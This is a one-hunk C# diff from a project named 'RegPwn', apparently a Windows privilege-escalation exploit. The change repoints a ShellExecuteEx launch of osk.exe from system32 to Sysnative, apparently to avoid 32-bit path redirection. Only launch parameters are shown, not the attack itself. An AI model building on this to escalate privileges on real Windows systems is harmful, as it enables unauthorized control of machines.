@@ -185,7 +185,7 @@ namespace RegPwn
                 cbSize = Marshal.SizeOf(typeof(WindowsApi.SHELLEXECUTEINFO)),
                 fMask = 0x00000040,
                 hwnd = IntPtr.Zero,
-                lpFile = @"C:\windows\system32\osk.exe",
+                lpFile = @"C:\windows\Sysnative\osk.exe",
                 lpParameters = null,
                 lpDirectory = null,
                 nShow = 0,
